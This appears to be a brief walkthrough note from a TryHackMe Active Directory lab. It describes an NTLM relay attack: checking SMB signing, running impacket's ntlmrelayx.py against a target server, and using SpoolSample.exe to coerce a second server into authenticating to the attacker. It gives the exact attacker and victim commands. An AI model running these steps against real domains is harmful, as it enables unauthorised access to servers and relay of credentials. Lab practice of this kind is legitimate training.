So, first of all, go and try to enumerate the network using the printer 
enumeration command from the enumeration section within this toolbox.

After that, you use the nmap script to scan the port to check whether 
SMB signing is enforced. 

There is a difference between SMB Signing being allowed, and being enforced.
If SMB signing is enforced, then we cannot use this vector. We will be 
hosting a malicious SMB server to gain access to this server.

The nmap script will be placed under the enum directory inside of AD for
convenience.

We will be using impacket's ntlmrelayx.py in order to get the relay back 
to our attackbox.

This is the command for the attackbox:
python3.9 /opt/impacket/examples/ntlmrelayx.py -smb2support -t smb://"THMSERVER1 IP" -debug

We will be using a C# malicious file named "SpoolSample" in order to do this
attack.

This is the command for the victim machine we are on:
C:\Tools\>SpoolSample.exe THMSERVER2.za.tryhackme.loc "Attacker IP"
